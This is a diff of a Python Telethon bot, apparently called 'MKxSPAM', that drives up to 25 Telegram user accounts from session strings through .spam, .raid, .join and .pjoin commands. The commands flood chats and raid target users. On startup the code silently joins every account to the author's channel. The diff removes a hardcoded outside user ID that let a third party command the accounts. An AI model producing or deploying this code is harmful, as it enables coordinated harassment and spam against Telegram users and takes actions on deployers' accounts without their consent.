@@ -1,20 +1,15 @@
 import os
 import sys
 import random
-from os import execl
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.tl.functions.account import UpdateProfileRequest
 from Config import SUDO, API_ID, API_HASH, STRING, STRING2, STRING3, STRING4 ,STRING5, STRING6, STRING7, STRING8 ,STRING9, STRING10, STRING11, STRING12 , STRING13 , STRING14 , STRING15 ,STRING16 , STRING17 , STRING18 , STRING19 , STRING20 , STRING21 , STRING22 , STRING23 , STRING24 , STRING25 
 import asyncio
-import telethon.utils
 from telethon.tl import functions
 from telethon.tl.functions.channels import LeaveChannelRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest
 from Utils import RAID
 from telethon.tl.functions.channels import JoinChannelRequest
-
-from telethon.tl.functions.users import GetFullUserRequest
 
 
 
@@ -73,11 +68,9 @@ M25 = ""
 
 
 que = {}
+MK_USERS = SUDO
 
-MK_USERS = [5219181232]
-for x in SUDO: 
-    MK_USERS.append(x)
-    
+
 async def StartMK():
     global M1
     global M2
@@ -115,21 +108,16 @@ async def StartMK():
             await M1(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M1(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M1(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M1.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 1 not Found")
-        session_name = "startup"
-        M1 = TelegramClient(session_name, API_ID, API_HASH)
+        M1 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M1.start()
         except Exception as e:
             pass
-   
+
     if MK2:
         session_name = str(MK2)
         print("String 2 Found")
@@ -140,16 +128,11 @@ async def StartMK():
             await M2(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M2(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M2(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M2.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 2 not Found")
-        session_name = "startup"
-        M2 = TelegramClient(session_name, API_ID, API_HASH)
+        M2 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M2.start()
         except Exception as e:
@@ -165,16 +148,11 @@ async def StartMK():
             await M3(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M3(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M3(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M3.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 3 not Found")
-        session_name = "startup"
-        M3 = TelegramClient(session_name, API_ID, API_HASH)
+        M3 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M3.start()
         except Exception as e:
@@ -190,16 +168,11 @@ async def StartMK():
             await M4(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M4(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M4(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M4.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 4 not Found")
-        session_name = "startup"
-        M4 = TelegramClient(session_name, API_ID, API_HASH)
+        M4 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M4.start()
         except Exception as e:
@@ -215,21 +188,16 @@ async def StartMK():
             await M5(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M5(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M5(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M5.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 5 not Found")
-        session_name = "startup"
-        M5 = TelegramClient(session_name, API_ID, API_HASH)
+        M5 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M5.start()
         except Exception as e:
             pass
-                  
+
     if MK6:
         session_name = str(MK6)
         print("String 6 Found")
@@ -240,16 +208,11 @@ async def StartMK():
             await M6(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M6(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M6(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M6.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 6 not Found")
-        session_name = "startup"
-        M6 = TelegramClient(session_name, API_ID, API_HASH)
+        M6 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M6.start()
         except Exception as e:
@@ -265,16 +228,11 @@ async def StartMK():
             await M7(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M7(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M7(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M7.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 7 not Found")
-        session_name = "startup"
-        M7 = TelegramClient(session_name, API_ID, API_HASH)
+        M7 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M7.start()
         except Exception as e:
@@ -290,21 +248,16 @@ async def StartMK():
             await M8(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M8(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M8(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M8.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 8 not Found")
-        session_name = "startup"
-        M8 = TelegramClient(session_name, API_ID, API_HASH)
+        M8 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M8.start()
         except Exception as e:
             pass   
-        
+
     if MK9:
         session_name = str(MK9)
         print("String 9 Found")
@@ -315,16 +268,11 @@ async def StartMK():
             await M9(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M9(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M9(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M9.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 9 not Found")
-        session_name = "startup"
-        M9 = TelegramClient(session_name, API_ID, API_HASH)
+        M9 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M9.start()
         except Exception as e:
@@ -340,16 +288,11 @@ async def StartMK():
             await M10(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M10(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M10(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M10.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 10 not Found")
-        session_name = "startup"
-        M10 = TelegramClient(session_name, API_ID, API_HASH)
+        M10 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M10.start()
         except Exception as e:
@@ -365,16 +308,11 @@ async def StartMK():
             await M11(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M11(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M11(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M11.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 11 not Found")
-        session_name = "startup"
-        M11 = TelegramClient(session_name, API_ID, API_HASH)
+        M11 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M11.start()
         except Exception as e:
@@ -390,16 +328,11 @@ async def StartMK():
             await M12(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M12(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M12(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M12.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 12 not Found")
-        session_name = "startup"
-        M12 = TelegramClient(session_name, API_ID, API_HASH)
+        M12 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M12.start()
         except Exception as e:
@@ -415,16 +348,11 @@ async def StartMK():
             await M13(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M13(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M13(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M13.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 13 not Found")
-        session_name = "startup"
-        M13 = TelegramClient(session_name, API_ID, API_HASH)
+        M13 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M13.start()
         except Exception as e:
@@ -440,16 +368,11 @@ async def StartMK():
             await M14(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M14(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M14(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M14.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 14 not Found")
-        session_name = "startup"
-        M14 = TelegramClient(session_name, API_ID, API_HASH)
+        M14 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M14.start()
         except Exception as e:
@@ -465,16 +388,11 @@ async def StartMK():
             await M15(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M15(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M15(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M15.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 15 not Found")
-        session_name = "startup"
-        M15 = TelegramClient(session_name, API_ID, API_HASH)
+        M15 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M15.start()
         except Exception as e:
@@ -490,21 +408,16 @@ async def StartMK():
             await M16(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M16(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M16(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M16.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 16 not Found")
-        session_name = "startup"
-        M16 = TelegramClient(session_name, API_ID, API_HASH)
+        M16 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M16.start()
         except Exception as e:
             pass
-   
+
     if MK17:
         session_name = str(MK17)
         print("String 17 Found")
@@ -515,21 +428,16 @@ async def StartMK():
             await M17(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M17(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M17(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M17.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 17 not Found")
-        session_name = "startup"
-        M17 = TelegramClient(session_name, API_ID, API_HASH)
+        M17 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M17.start()
         except Exception as e:
             pass
-   
+
     if MK18:
         session_name = str(MK18)
         print("String 18 Found")
@@ -540,21 +448,16 @@ async def StartMK():
             await M18(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M18(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M18(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M18.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 18 not Found")
-        session_name = "startup"
-        M18 = TelegramClient(session_name, API_ID, API_HASH)
+        M18 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M18.start()
         except Exception as e:
             pass
-   
+
     if MK19:
         session_name = str(MK19)
         print("String 19 Found")
@@ -565,21 +468,16 @@ async def StartMK():
             await M19(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M19(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M19(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M19.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 19 not Found")
-        session_name = "startup"
-        M19 = TelegramClient(session_name, API_ID, API_HASH)
+        M19 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M19.start()
         except Exception as e:
             pass
-   
+
     if MK20:
         session_name = str(MK20)
         print("String 20 Found")
@@ -590,21 +488,16 @@ async def StartMK():
             await M20(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M20(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M20(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M20.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 20 not Found")
-        session_name = "startup"
-        M20 = TelegramClient(session_name, API_ID, API_HASH)
+        M20 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M20.start()
         except Exception as e:
             pass
-   
+
     if MK21:
         session_name = str(MK21)
         print("String 21 Found")
@@ -615,21 +508,16 @@ async def StartMK():
             await M21(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M21(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M21(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M21.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 21 not Found")
-        session_name = "startup"
-        M21 = TelegramClient(session_name, API_ID, API_HASH)
+        M21 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M21.start()
         except Exception as e:
             pass
-   
+
     if MK22:
         session_name = str(MK22)
         print("String 22 Found")
@@ -640,21 +528,16 @@ async def StartMK():
             await M22(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M22(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M22(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M22.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 22 not Found")
-        session_name = "startup"
-        M22 = TelegramClient(session_name, API_ID, API_HASH)
+        M22 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M22.start()
         except Exception as e:
             pass
-   
+
     if MK23:
         session_name = str(MK23)
         print("String 23 Found")
@@ -665,21 +548,16 @@ async def StartMK():
             await M23(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M23(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M23(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M23.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 23 not Found")
-        session_name = "startup"
-        M23 = TelegramClient(session_name, API_ID, API_HASH)
+        M23 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M23.start()
         except Exception as e:
             pass
-   
+
     if MK24:
         session_name = str(MK24)
         print("String 24 Found")
@@ -690,21 +568,16 @@ async def StartMK():
             await M24(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M24(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M24(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M24.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 24 not Found")
-        session_name = "startup"
-        M24 = TelegramClient(session_name, API_ID, API_HASH)
+        M24 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M24.start()
         except Exception as e:
             pass
-   
+
     if MK25:
         session_name = str(MK25)
         print("String 25 Found")
@@ -715,41 +588,19 @@ async def StartMK():
             await M25(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M25(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
             await M25(functions.channels.JoinChannelRequest(channel="@TheMKHackerX131"))
-            botme = await M25.get_me()
-            botid = telethon.utils.get_peer_id(botme)
-            MK_USERS.append(botid)
         except Exception as e:
             print(e)
-            pass
     else:
         print("Session 25 not Found")
-        session_name = "startup"
-        M25 = TelegramClient(session_name, API_ID, API_HASH)
+        M25 = TelegramClient("startup", API_ID, API_HASH)
         try:
             await M25.start()
         except Exception as e:
             pass
 
 
-
 loop = asyncio.get_event_loop()
-loop.run_until_complete(StartMK())       
-
-async def gifspam(e, smex):
-    try:
-        await e.client(
-            functions.messages.SaveGifRequest(
-                id=types.InputDocument(
-                    id=sandy.media.document.id,
-                    access_hash=smex.media.document.access_hash,
-                    file_reference=smex.media.document.file_reference,
-                ),
-                unsave=True,
-            )
-        )
-    except Exception as e:
-        pass
-
+loop.run_until_complete(StartMK())
 
 
 @M1.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@@ -778,10 +629,7 @@ async def gifspam(e, smex):
 @M24.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
 @M25.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
 async def spam(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
     if e.sender_id in MK_USERS:
-        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
-            return await e.reply(usage, parse_mode=None, link_preview=None )
         aries = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         mk = await e.get_reply_message()
         if len(aries) == 2:
@@ -794,13 +642,6 @@ async def spam(e):
                     else:
                         await e.client.send_message(e.chat_id, message)
                     await asyncio.sleep(0.1)
-        elif e.reply_to_msg_id and mk.media:  
-            counter = int(aries[0])
-            for _ in range(counter):
-                async with e.client.action(e.chat_id, "document"):
-                    mk = await e.client.send_file(e.chat_id, mk, caption=mk.text)
-                    await gifspam(e, mk) 
-                await asyncio.sleep(0.1)  
         elif e.reply_to_msg_id and mk.text:
             message = mk.text
             counter = int(aries[0])
@@ -808,8 +649,6 @@ async def spam(e):
                 async with e.client.action(e.chat_id, "typing"):
                     await e.client.send_message(e.chat_id, message)
                     await asyncio.sleep(0.1)
-        else:
-            await e.reply(usage, parse_mode=None, link_preview=None )
 
 
 
@@ -840,10 +679,7 @@ async def spam(e):
 @M25.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
 
 async def spam(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
     if e.sender_id in MK_USERS:
-        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
-            return await e.reply(usage, parse_mode=None, link_preview=None )
         aries = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         await e.get_reply_message()
         if len(aries) == 2:
@@ -872,8 +708,6 @@ async def spam(e):
                 async with e.client.action(e.chat_id, "typing"):
                     await e.client.send_message(e.chat_id, caption)
                     await asyncio.sleep(0.1)
-        else:
-            await e.reply(usage, parse_mode=None, link_preview=None )
 
 
 
@@ -904,7 +738,6 @@ async def spam(e):
 @M25.on(events.NewMessage(incoming=True, pattern=r"\.join"))
 
 async def _(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
     if e.sender_id in MK_USERS:
         mkj = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 6:
@@ -915,9 +748,7 @@ async def _(e):
                 await e.client(functions.channels.JoinChannelRequest(channel=bc))
                 await event.edit("𝗔𝗟𝗟 𝗦𝗘𝗧 𝗘𝗡𝗧𝗘𝗥𝗘𝗗 🔥")
             except Exception as e:
-                await event.edit(str(e))   
-        else:
-            await e.reply(usage, parse_mode=None, link_preview=None )
+                await event.edit(str(e))
             
  
 
@@ -948,7 +779,6 @@ async def _(e):
 @M25.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
 
 async def _(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
     if e.sender_id in MK_USERS:
         mkl = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 7:
@@ -960,9 +790,7 @@ async def _(e):
                 await event.client(LeaveChannelRequest(bc))
                 await event.edit("𝐒𝐎𝐎𝐍 𝐁𝐀𝐂𝐊 𝐁𝐒𝐃𝐊 🥃")
             except Exception as e:
-                await event.edit(str(e))   
-        else:
-            await e.reply(usage, parse_mode=None, link_preview=None )
+                await event.edit(str(e))
 
 
 
@@ -992,7 +820,6 @@ async def _(e):
 @M24.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
 @M25.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
 async def _(e):
-    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/TheMKHackerX131\n\n.pjoin TheMKHackerX131"
     if e.sender_id in MK_USERS:
         mkp = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(e.text) > 7:
@@ -1003,9 +830,7 @@ async def _(e):
                 await e.client(ImportChatInviteRequest(bc))
                 await event.edit("𝐀𝐋𝐋 𝐒𝐄𝐓 𝐄𝐍𝐓𝐄𝐑𝐄𝐃 𝐈𝐍 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐂𝐇𝐀𝐓 🔥")
             except Exception as e:
-                await event.edit(str(e))   
-        else:
-            await e.reply(usage, parse_mode=None, link_preview=None )
+                await event.edit(str(e))
 
 
 
@@ -1174,7 +999,8 @@ async def restart(e):
         os.execl(sys.executable, sys.executable, *sys.argv)
         quit()
 
-print("\n𝐌𝐊𝐱𝐒𝐏𝐀𝐌 𝐃𝐄𝐏𝐋𝐎𝐘𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 😎🤘🏻\nMy Master ---> @𝐇𝐀𝐂𝐊𝟑𝐑_𝐗𝐃")
+
+print("\n𝐇𝐀𝐂𝐊𝐄𝐑𝐱𝐒𝐏𝐀𝐌 𝐃𝐄𝐏𝐋𝐎𝐘𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 😎🤘🏻\nMy Master ---> @𝐇𝐀𝐂𝐊𝟑𝐑_𝐗𝐃")
 
 if len(sys.argv) not in (1, 3, 4):
     try:
